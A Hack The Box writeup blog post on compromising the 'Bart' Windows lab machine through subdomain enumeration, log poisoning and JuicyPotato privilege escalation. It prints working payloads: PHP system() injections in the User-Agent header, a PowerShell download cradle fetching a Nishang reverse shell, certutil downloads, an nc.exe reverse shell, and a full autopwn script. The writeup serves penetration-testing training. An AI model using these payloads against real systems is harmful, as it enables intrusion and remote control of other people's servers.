---
layout: post
title:  "Bart Writeup - Hack The Box"
date:   2025-03-06
desc: ""
keywords: "HTB,OSCP,eWPT,eWPTXv2,OSWE,Windows,SubdomainEnumeration,SimpleChatExploitation,LogPoisoningAttack,AbusingSetImpersonatePrivilege,Medium"
categories: [HTB]
tags: [HTB,OSCP,eWPT,eWPTXv2,OSWE,Windows,SubdomainEnumeration,SimpleChatExploitation,LogPoisoningAttack,AbusingSetImpersonatePrivilege,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/bart_writeup/Bart.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

All the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** boxes I've been doing these last weeks are **Windows**, which are helping me a lot to **strengthen** old concepts and investigate new ones, they also lead me to think outside the box, a skill that every professional in the field of **Information Security** must constantly refine. A box categorized as **medium**, the **Bart**, took me to work mentally very hard to recognize the path I had to follow to engage it. The vulnerabilities that this machine possesses are well known, but to recognize them one must sharpen one's attacker's eyes. I am already fully focused on the next challenge, so I sign in with my account to the platform and **spawn** the box.

<br /><br />
<img src="{{ site.img_path }}/bart_writeup/Bart_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I verify the connectivity with the target machine and perform the first **Reconnaissance** commands to get a first idea of the services that are available and that I will try to use to engage it. Only one web service (using the unsecured **HTTP** protocol) is exposed on port **80**, so I'm going to have to do a lot of work on enumeration. With `nmap` it leaks information from a subdomain, so if I use `whatweb` to find out the technologies implemented in the service it requires me to add it because my machine can't resolve it correctly. Once it makes the modifications to my **`hosts`** file, I can go back to using `whatweb` and also **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, which gives me a very important piece of information, a **WordPress 4.8.2 CMS** is being deployed.

```bash
ping -c 1 10.129.96.185
whichSystem.py 10.129.96.185
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.96.185 -oG allPorts
nmap -sCV -p80 10.129.96.185 -oN targeted
cat targeted
#    --> Microsoft IIS httpd 10.0
#    --> http://forum.bart.htb/

whatweb http://10.129.96.185              # :(
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 bart.htb
ping -c 1 forum.bart.htb
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The first thing I do when I have only the web service, is to browse and sharpen my eyes to find information that might be interesting to engage the server, in this case I find a list of possible usernames. The good or bad, <ins>depending on the experience that the professional possesses</ins>, is the large attack surface that a web page can offer. With `searchsploit` I look for the exploit that allows to enumerate user in a **WordPress CMS**, but there is no path in this box, nor the typical path to login, which is a good practice that the developer should incorporate.

```bash
nvim Users.txt
# :%s/,/\r/g

# http://forum.bart.htb/
# http://forum.bart.htb/wp-admin/                   # :(

searchsploit wordpress user enumeration
searchsploit -x php/webapps/41497.php
# http://forum.bart.htb/wp-json/wp/v2/users/        # :(
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue enumerating the **WordPress CMS** with `wfuzz`, to find some hidden directory, but I have no luck because I should use some specific dictionary for this technology. Before continuing, I remember the **main domain** (**bart.htb**) and if I enumerate it I find a path, but the `wfuzz` tool does not run correctly, even if I use the **-Z** parameter to **[skip errors](https://wfuzz.readthedocs.io/en/latest/user/advanced.html#scan-mode-ignore-errors-and-exceptions){:target="_blank"}**.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://forum.bart.htb/FUZZ
# :(
wfuzz -c --hc=404 --hh=75 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://forum.bart.htb/FUZZ
# :(

# bart.htb?
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ
wfuzz -c --hc=404 --hh=150693 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ
# :(

wfuzz -c -t 10 --hc=404 --hh=150693 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ
# Operation timed out after 90000 milliseconds with 156154 out of 158607 bytes received

wfuzz -c -t 10 -Z --hc=404 --hh=150693 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try with other tools, like `gobuster` or `dirb` but I still can't get error free results. But if I use the `dirbuster` tool, which has a graphical interface, I can adjust some parameters and now I can complete the search with all the words of the dictionary I chose, so I find two results, including the one found by `wfuzz`.

```bash
gobuster dir -u http://bart.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --exclude-length 158607
# :(
dirb http://bart.htb/ /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
# (!) WARNING: Wordlist is too large.

dirbuster -g -t 100 -v -u http://bart.htb/ -l /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
# forum, monitor
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If it becomes impossible to get results with all the available tools, which is a very unlikely scenario, since with `dirb` I can get effective results if I pass the values indicated by the parameters, I can perform the enumeration manually with **[BurpSuite](https://portswigger.net/burp){:target="_blank"}**. This great tool behaves as a **Proxy** and can capture the traffic, and modify the requests to the server as I wish, in this case I will use the **Intruder** feature and perform a **Sniper attack** and pass the dictionary that I indicate, I just have to tell **[BurpSuite](https://portswigger.net/burp){:target="_blank"}** in which position should try the different words and then the same is responsible for starting the attack. I only have to be aware of the **length** of the **response** (<ins>for this box</ins>, in other cases you can be aware of other factors), unfortunately it takes me a long time to find the results since I don't have the paid version.

```bash
burpsuite &>/dev/null & disown
# Sniper attack     Forum   Length: 339
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Of the two paths I found, one redirects me to the website I had already inspected before, but the other one allows me to access the **Authentication panel**. In the web page you can see the technology that is being offered (**PHP Server Monitor**), and with `searchsploit` I can look for possible attack vectors, there is a **[Cross-Site Request Forgery](https://portswigger.net/web-security/csrf){:target="_blank"}** but at the moment I am not convinced that it is the best. As I have a list of usernames and thanks to the possibility of requesting a password reset, it is possible to list the valid users just by observing the message of the server response to each reset attempt. If I also try to use as password the last name of the user I don't have the result I expect, for the moment.

> **[PHP Server Monitor](https://www.phpservermonitor.org/){:target="_blank"}** is a script that checks whether your websites and servers are up and running. It comes with a web based user interface where you can manage your services and websites, and you can manage users for each server with a mobile number and email address.

```bash
searchsploit php server monitor
searchsploit -x php/webapps/45932.txt

# http://bart.htb/monitor/?action=forgot
#    -> Samantha     :(
#    -> Daniel       :)
#    -> Robert       :(
#    -> Harvey       :)

# http://bart.htb/monitor/            Login:
#    -> Daniel:simmons       :(
#    -> Daniel:Simmons       :(
#
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the source code of the page where I had found the usernames, there is one more (**Harvey Potter**), which is not visible on the page because it is commented out in the code. With this one if I have luck and I can authenticate successfully, but it redirects me to a **new subdomain**, so I must update again my **hosts** file so that the Browser resolves correctly, once I do it I can access and I find in the main page a new domain.

```bash
# http://bart.htb/monitor/
# -> Harvey:potter        :)
# monitor.bart.htb !

nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 monitor.bart.htb

# http://monitor.bart.htb/?&mod=server
# internal-01.bart.htb
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

When I modify the **hosts** file again, I access a new authentication panel, I try unsuccessfully to access with the users I have in my list. I see in the **URL** the names of the **.php** scripts used by the system and if I do a little **Google Dorking** and search what is `simple_chat.php` I find the **[magkopian project](https://github.com/magkopian/php-ajax-simple-chat/blob/master/simple_chat/login_form.php){:target="_blank"}** in **Github** where all the resources available for analysis are found. The one that most attracts my attention are those related to user registration (`register_form.php`, `register.php`), but if I access with the browser, one redirects me to the other and I can not access the content, most likely because I am not authenticated.

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 internal-01.bart.htb

# http://internal-01.bart.htb/simple_chat/login_form.php
# GoogleDork!

# http://internal-01.bart.htb/simple_chat/register.php        # Redirect
# http://internal-01.bart.htb/simple_chat/register_form.php   # :(
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

When I analyze the `register.php` script, I can know the names of the parameters to **register a new user**, if I send a request using the **POST** method with `curl` I achieve my goal of creating an account. Now I can access the chat and the first thing I check if it is vulnerable to **HTML injection** or **XSS**, and it seems that the code is sanitized, although it only tests basic injections but there are some very complex ones that for the moment I will not test.

```bash
# Page Source (register.php) --> $_POST['uname']     $_POST['passwd']      $_POST['recaptcha_challenge_field']

curl -s -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=oldb0y&passwd=oldb0y123"

# http://internal-01.bart.htb/simple_chat/register_form.php   # :)
#  --> <h2>HELLO GUYS!</h2>                   :(
#  --> <script>alert('XSS');</script>         :(
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since code analysis has been involved in completely all of the **Engagement** so far, I'm going to continue looking at it and find a script in **JS** from which a new **URL** is leaked. If I access it I get a **“1”** as output, so I start doing some tests with the **URL**, when I pass an invalid user value to the **username** parameter, I get a **“0”** as output. I deduce by the name of the script (`log.php`) and by the results of the tests that I am making, that perhaps the attack vector is a **[Log Poisoning](https://portswigger.net/web-security/web-cache-poisoning){:target="_blank"}**, it only remains to look for the way to engage the box. I also have the advantage of being able to access the file (`log.txt`) where the logs that I am generating are being stored.

```html
# [Ctrl+c] or [Ctrl+u]
# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey

# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey      # 1
# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harve       # 0
# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=daniel      # 1
# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=samantha    # 0

# http://internal-01.bart.htb/log/log.txt                                       # Log Poisoning?
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I already made some **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines exploiting this vulnerability, I have some idea of **what to do**, the first thing I do is to check if I have control over the file where the logs are saved, and **if I do**, I can even pass with the **<ins>filename</ins>** parameter the name of the file where I want them to be saved. So I'm going to pass as name, a file with **.php** extension (to make sure that the server interprets the commands I'm going to inject) and then with `python` I'm going to send the requests (I could also use **BurpSuite**) and check if I have a **RCE**. The poisoning works correctly and I could also check that I have connectivity to the target machine.

```bash
# http://internal-01.bart.htb/log/log.php?filename=oldboy_test.txt&username=harvey
# http://internal-01.bart.htb/log/oldboy_test.txt                                     # :)

# http://internal-01.bart.htb/log/log.php?filename=oldboy.php&username=harvey
# http://internal-01.bart.htb/log/oldboy.php                                          # :)
# Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0  User-Agent

python3
  import requests
  headers = {'User-Agent':'<?php system("whoami"); ?>'}
  r = requests.get("http://internal-01.bart.htb/log/log.php?filename=oldboy.php&username=harvey", headers=headers)

# http://internal-01.bart.htb/log/oldboy.php
# nt authority\iusr       :)

  headers = {'User-Agent':'<?php system("ping 10.10.14.84");?>'}
  r = requests.get("http://internal-01.bart.htb/log/log.php?filename=oldboy.php&username=harvey", headers=headers)

tcpdump -i tun0 icmp -n

# http://internal-01.bart.htb/log/oldboy.php
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before trying to **Engage** the box, I am going to inquire about the configuration settings on the server with **phpinfo()**, what I am most interested in are those functions related to the execution of commands that may be **blacklisted**, but there is no control (**very bad practice**). Now if I can use a **[Nishang](https://www.kali.org/tools/nishang/){:target="_blank"}** script to get a **Reverse Shell**, I just need to open a port with `nc` to establish the remote connection, send the request using `python` with the correct command and refresh the page to access my target. I can now perform the basic **recon** commands.

> **Attacker Machine**:

```bash
python3
  imports requests
  headers = {'User-Agent':'<?php phpinfo();?>'}
  r = requests.get("http://internal-01.bart.htb/log/log.php?filename=oldboy.php&username=harvey", headers=headers)

# http://internal-01.bart.htb/log/oldboy.php

cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
nvim !$
nvim PS.ps1
cat PS.ps1 | tail -n 2
# Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.84 -Port 443
python3 -m http.server 80

  headers = {'User-Agent':'<?php system("powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.84/PS.ps1\')");?>'}
  r = requests.get("http://internal-01.bart.htb/log/log.php?filename=oldboy.php&username=harvey", headers=headers)

sudo rlwrap -cAr nc -nlvp 443

# http://internal-01.bart.htb/log/oldboy.php
```

> **Victime Machine**:

```cmd
whoami
hostname
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Working with the **[hack4u](https://hack4u.io/){:target="_blank"}** community in the **[S4vitar](https://www.twitch.tv/s4vitaar){:target="_blank"}** live sessions, we were able to develop a `python` script to perform the **autopwn** and obtain a **Reverse Shell**. The procedure starts with the authentication on the website **http://monitor.bart.htb**, for that I must be careful because I need the **CSRF Token** value, which I can leak it by inspecting the code and using the `python` **re** library. The next step is to know the names of the parameters that store the values of the user and password, I can now perform a test and authenticate successfully. From the response I get from the server, with **re** I can leak the other subdomain (**internal-01.bart.htb**).

```bash
# Autopwn
# 1st Token
# http://monitor.bart.htb/            [Ctrl+u]

python3 autopwn_hack4u.py old boy
  r.text
  re.findall(r'name="csrf" value="(.*?)"', r.text)
  re.findall(r'name="csrf" value="(.*?)"', r.text)[0]

# 2nd First Leaked Url
python3 autopwn_hack4u.py old boy
  r.text
  re.findall(r'title="Website"></i> (.*?)<', r.text)
  re.findall(r'title="Website"></i> (.*?)<', r.text)[0]
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The next thing to code is the login on the website **http://internal-01.bart.htb**, for that I need the names of the parameters that I can get by simulating an authentication and analyze the traffic directly in the browser. With the **re** library, I leak the **URL** that allows me to poison the logs, and I can send the malicious request with the command I want to be executed, before I get a **Reverse Shell** I try to send a `ping` trace to see if the script works correctly.

```bash
# 3rd Register user
# 4th Obtain URL Poissoning
python3 autopwn_hack4u.py old0y boy
  r.text
  re.findall(r"GET\', \'(.*?)\'", r.text)
  re.findall(r"GET\', \'(.*?)\'", r.text)[0]

# 5th Make Poisson
sudo tcpdump -i tun0 icmp -n
python3 autopwn_hack4u.py arnold ping.php             # :)
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I can send the request with the malicious command injected in the **User-Agent** field of the Header to get a **Reverse Shell**. Everything works correctly, but in the first attempt I use `nc` to wait for the connection, so to avoid this I make some last modifications in the script and this way I create an interactive shell when executing it. I just have to perform some recon commands and I find that the compromised user has the **SeImpersonatePrivilege** privilege, so maybe he is susceptible to privilege escalation using **[Juicy-Potato](https://github.com/k4sth4/Juicy-Potato){:target="_blank"}**. Before downloading the malicious binary I must check the **OS architecture** (**x64-based PC**).

> **autopwn_hack4u.py**:

```python
#!/usr/bin/python3

import sys,signal,pdb,requests,re,threading
# from pwn import *

if len(sys.argv) != 3:
    print("\n\n[!] Use: " + sys.argv[0] + " <username> <malicious file>\n")
    sys.exit(1)

def def_handler(sig,frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables

username = sys.argv[1]
url_log_name = sys.argv[2]
monitor_url = "http://monitor.bart.htb/"
monitor_internal_url = "http://monitor.bart.htb/?&mod=server"
lport = 443

def webMonitorAuthentication():

    s = requests.session()
    r = s.get(monitor_url)

    # pdb.set_trace()

    csrfToken = re.findall(r'name="csrf" value="(.*?)"', r.text)[0]

    auth_data = {
        'csrf': csrfToken,
        'user_name': 'harvey',
        'user_password': 'potter',
        'action': 'login'
    }

    r = s.post(monitor_url, data=auth_data)
    r = s.get(monitor_internal_url)

    # pdb.set_trace()

    url_found = re.findall(r'title="Website"></i> (.*?)<', r.text)[1]
    return url_found

def register_user(leaked_url):

    full_register_url = leaked_url + "simple_chat/register.php"

    post_data = {
        'uname': username,
        'passwd': '%s123' % username
    }

    r = requests.post(full_register_url, data=post_data)

def obtainUrlPoissoning(leaked_url):

    full_login_url = leaked_url + "simple_chat/login.php"

    s = requests.session()

    post_data = {
        'uname': username,
        'passwd': '%s123' % username,
        'submit': 'Login'
    }

    r = s.post(full_login_url, data=post_data)

    r = s.get(leaked_url)

    #pdb.set_trace()

    url_poissoning_founded = re.findall(r"GET\', \'(.*?)\'", r.text)[0]
    return url_poissoning_founded

def injectPoisson(poissoning_url, leaked_url):

    poissoning_url = str.replace(poissoning_url, "log.txt", '%s' % url_log_name)
    rce_url = leaked_url + "log/%s" % url_log_name

    headers = {
            'User-Agent': '<?php system("powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.84/PS.ps1\')") ?>'
    }

    r = requests.get(poissoning_url, headers=headers)
    r = requests.get(rce_url)

if __name__ == '__main__':

    leaked_url = webMonitorAuthentication()
    register_user(leaked_url)
    poissoning_url = obtainUrlPoissoning(leaked_url)

    injectPoisson(poissoning_url,leaked_url)
    # try:
        # threading.Thread(target=injectPoisson, args=(poissoning_url,leaked_url)).start()
    # except Exception as e:
        # log.error(str(e))

    # shell = listen(lport, timeout=20).wait_for_connection()
    # shell.interactive()
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
sudo rlwrap -cAr nc -nlvp 443
python3 autopwn_hack4u.py oldboy poisson.php          # :)

# or (interactive shell):
nvim autopwn_hack4u.py
python3 -m http.server 80
./bin/python3 ../exploits/autopwn_hack4u.py oldboy logpoisson.php
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig

whoami /priv
# SeImpersonatePrivilege      --> JuicyPotato.exe

systemInfo
# System Type:               x64-based PC
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I just need to download the `jp.exe` binary and then transfer it on the target machine (if the firewall blocks the download, a custom binary can be created with **[Ebowla](https://github.com/Genetic-Malware/Ebowla){:target="_blank"}** to bypass it). I already know the command to get a **Reverse Shell** as the user with maximum privileges, but it doesn't work because I need a new **CLSID**. The **k4sth4** project repository I can find a **[list of CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro){:target="_blank"}** for each version of **Windows OS**, so by modifying the command I can already **Escalate Privilege** and access the flags I need to enter in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/jp.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/jp.exe jp.exe
.\jp.exe
```

> **Attacker Machine**:

```bash
locate nc.exe /usr
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/nc.exe nc.exe

.\jp.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.84 443"
# :(
```

> **Attacker Machine**:

```bash
sudo rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\jp.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.84 443" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bart_writeup/Bart_82.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a great way to incorporate concepts, improve skills, code new tools, analyze code and many other things the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform offers you. Engaging the **Bart** box, I also learned that working in community is much more rewarding, not only for the help you get but also the different points of view on the same problem broaden the perspective that one can have when working alone. I must not forget to kill the box and continue my journey as a pentester student.

<br /><br />
